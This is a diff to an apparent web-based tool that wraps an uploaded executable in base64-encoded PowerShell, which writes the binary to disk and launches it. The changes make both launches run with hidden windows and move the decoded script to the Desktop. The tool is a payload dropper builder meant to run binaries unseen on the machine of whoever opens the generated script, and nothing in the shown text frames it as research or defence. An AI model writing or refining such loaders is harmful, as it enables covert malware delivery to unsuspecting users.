@@ -61,7 +61,7 @@
             reader.onload = function(event) {
                 const base64String = event.target.result.split(',')[1];
                 finalPSCode = `
-                $b="${base64String}";[IO.File]::WriteAllBytes("executable.exe",[Convert]::FromBase64String($b));Start-Process "executable.exe";
+                $b="${base64String}";[IO.File]::WriteAllBytes("executable.exe",[Convert]::FromBase64String($b));Start-Process -FilePath "executable.exe" -WindowStyle Hidden -NoNewWindow;
                 `;
                 document.getElementById("ps-output").textContent = "PowerShell Code: " + finalPSCode.trim().substring(0, 50) + '...';
             };
@@ -86,11 +86,11 @@
             // Encode the PowerShell code in base64
             const encodedCode = btoa(finalPSCode);
             
-            // Create a shorter PowerShell script that retrieves the code from a temp file
+            // Create a PowerShell script that saves the decrypted script on the Desktop
             const psFileContent = `
             $code = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('${encodedCode}'));
-            Set-Content -Path "$env:TEMP\script.ps1" -Value $code;
-            Start-Process -FilePath "$env:TEMP\script.ps1";
+            Set-Content -Path "$([Environment]::GetFolderPath('Desktop'))\\script.ps1" -Value $code;
+            Start-Process -FilePath "$([Environment]::GetFolderPath('Desktop'))\\script.ps1" -WindowStyle Hidden -NoNewWindow;
             `;
 
             const blob = new Blob([psFileContent], { type: 'application/octet-stream' });
@@ -101,7 +101,7 @@
             link.click();
             document.body.removeChild(link);
 
-            alert("Encrypted PowerShell script downloaded!");
+            alert("Encrypted PowerShell script downloaded to Desktop!");
         }
     </script>
 
